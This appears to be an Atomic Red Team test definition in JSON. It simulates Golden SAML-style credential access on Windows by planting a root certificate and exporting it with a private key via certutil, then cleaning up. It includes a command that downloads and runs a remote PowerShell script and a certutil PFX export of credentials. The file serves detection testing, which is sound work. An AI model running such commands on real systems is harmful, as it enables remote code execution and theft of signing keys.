{
  "id": "336b25bf-4514-4684-8924-474974f28137",
  "name": "CertUtil ExportPFX",
  "description": "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "47701e87-ac3c-4db2-873b-0f7c0005123c",
      "type": "execute-command",
      "data": {
        "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "d9af4007-541f-4dcf-a911-a6307f621b8d",
      "type": "execute-command",
      "data": {
        "command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "47701e87-ac3c-4db2-873b-0f7c0005123c",
      "p": "on-success",
      "o": "d9af4007-541f-4dcf-a911-a6307f621b8d"
    },
    {
      "s": "47701e87-ac3c-4db2-873b-0f7c0005123c",
      "p": "on-failure",
      "o": "d9af4007-541f-4dcf-a911-a6307f621b8d"
    }
  ],
  "tags": [
    "T1552.004",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "password",
      "type": "string",
      "description": "password for cert",
      "value": "password"
    },
    {
      "name": "output",
      "type": "path",
      "description": "file path to export to",
      "value": "c:\\temp\\atomic.pfx"
    }
  ]
}